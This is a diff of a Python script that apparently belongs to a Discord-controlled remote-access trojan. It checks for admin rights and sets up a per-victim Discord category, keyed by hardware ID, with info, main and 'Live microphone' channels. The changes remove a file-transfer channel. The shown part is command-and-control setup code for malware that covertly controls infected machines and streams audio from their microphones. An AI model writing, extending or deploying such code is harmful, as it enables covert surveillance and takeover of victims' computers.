@@ -24,16 +24,11 @@ if not IsAdmin():
 
 client = commands.Bot(command_prefix=['.'], intents=discord.Intents.all(), case_insensitive=True)
 
-# temp area for needed variables, mategol you should add something to do this automatically in the builder ig :p
-turned_off = False
-# end of area
-
 bot_token = ""
 guild_ids = []
 channel_ids = {                                                    
     'info': 'auto',                                               
     'main': 'auto',                                                                                               
-    'file': 'auto',
     'voice': 'auto'                                                                                            
 }
 
@@ -73,9 +68,9 @@ async def on_ready():
         for channel in category.channels:
             category_channel_names.append(channel.name)
 
-        if 'file-related' not in category_channel_names and channel_ids['file']: 
-            temp = await client.get_guild(guild_id).create_text_channel('file', category=category)
-            channel_ids['file'] = temp.id
+        if 'main' not in category_channel_names and channel_ids['main']: 
+            temp = await client.get_guild(guild_id).create_text_channel('main', category=category)
+            channel_ids['main'] = temp.id
 
         if 'Live microphone' not in category_channel_names and channel_ids['voice']: 
             temp = await client.get_guild(guild_id).create_voice_channel('Live microphone', category=category)
@@ -85,7 +80,6 @@ async def on_ready():
         category = await client.get_guild(guild_id).create_category(hwid)
         temp = await client.get_guild(guild_id).create_text_channel('info', category=category); channel_ids['info'] = temp.id
         temp = await client.get_guild(guild_id).create_text_channel('main', category=category); channel_ids['main'] = temp.id
-        temp = await client.get_guild(guild_id).create_text_channel('file-related', category=category); channel_ids['file'] = temp.id
         temp = await client.get_guild(guild_id).create_voice_channel('Live microphone', category=category); channel_ids['voice'] = temp.id
 
         try: 
@@ -112,8 +106,6 @@ async def on_ready():
                 channel_ids['info'] = channel.id
             elif channel.name == 'main':
                 channel_ids['main'] = channel.id
-            elif channel.name == 'file-related':
-                channel_ids['file'] = channel.id
             elif channel.name == 'Live microphone':
                 channel_ids['voice'] = channel.id
 
